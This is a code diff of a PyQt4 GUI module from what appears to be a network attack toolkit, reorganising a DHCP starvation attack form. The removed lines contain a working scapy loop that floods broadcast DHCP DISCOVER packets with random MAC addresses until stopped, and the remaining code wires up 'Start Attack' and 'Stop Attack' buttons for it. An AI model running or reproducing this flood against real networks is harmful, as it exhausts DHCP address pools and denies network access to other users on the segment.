@@ -16,36 +16,8 @@
 #CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
-from scapy.all import *
-from os import system,popen,getegid
 from Core.Settings import frm_Settings
-from Modules.utils import Refactor
-import time
-
-class ThreadAttackStar(QThread):
-    def __init__(self,interface):
-        QThread.__init__(self)
-        self.interface = interface
-        self.process = True
-
-    def run(self):
-        print "Starting Thread:" + self.objectName()
-        self.count = 0
-        while self.process:
-            conf.checkIPaddr = False
-            dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")\
-                /IP(src="0.0.0.0",dst="255.255.255.255")\
-                /UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))\
-            /DHCP(options=[("message-type","discover"),"end"])
-            sendp(dhcp_discover)
-            self.count += 1
-            self.data = ("PacketSend:[%s] DISCOVER Interface: %s "%(self.count,self.interface)
-                         + time.strftime("%c"))
-            self.emit(SIGNAL("Activated( QString )"),self.data.rstrip())
-        self.emit(SIGNAL("Activated( QString )"),"[ OFF ] Packet sent: " + str(self.count))
-    def stop(self):
-        print "Stop thread:" + self.objectName()
-        self.process = False
+from Modules.utils import Refactor,ThreadAttackStar
 
 class frm_dhcp_main(QMainWindow):
     def __init__(self, parent=None):
@@ -66,17 +38,17 @@ class frm_dhcp_main(QMainWindow):
 class frm_dhcp_Attack(QWidget):
     def __init__(self, parent=None):
         super(frm_dhcp_Attack, self).__init__(parent)
-        self.Main = QVBoxLayout()
-        self.control = None
+        self.Main       = QVBoxLayout()
+        self.control    = None
         self.GUI()
     def GUI(self):
-        self.form = QFormLayout()
-        self.list_log = QListWidget()
-        self.check = QLabel("")
+        self.form       = QFormLayout()
+        self.list_log   = QListWidget()
+        self.check      = QLabel("")
+        self.btn_Start_attack   = QPushButton("Start Attack",self)
+        self.btn_Stop_attack    = QPushButton("Stop Attack",self)
         self.check.setText("[ OFF ]")
         self.check.setStyleSheet("QLabel {  color : red; }")
-        self.btn_Start_attack = QPushButton("Start Attack",self)
-        self.btn_Stop_attack = QPushButton("Stop Attack",self)
 
         self.btn_Start_attack.clicked.connect(self.D_attack)
         self.btn_Stop_attack.clicked.connect(self.kill_thread)
@@ -103,11 +75,12 @@ class frm_dhcp_Attack(QWidget):
             self.connect(self.threadstar,SIGNAL("Activated ( QString )"),self.getloggerAttack)
             self.threadstar.setObjectName("DHCP Starvation")
             self.threadstar.start()
-        else:
-            QMessageBox.information(self, "Interface Not found", 'None detected network interface try again.')
+            return
+        QMessageBox.information(self, 'Interface Not found', 'None detected network interface try again.')
 
     def attack_OFF(self):
         self.check.setStyleSheet("QLabel {  color : red; }")
+
     def kill_thread(self):
         self.threadstar.stop()
         self.attack_OFF()
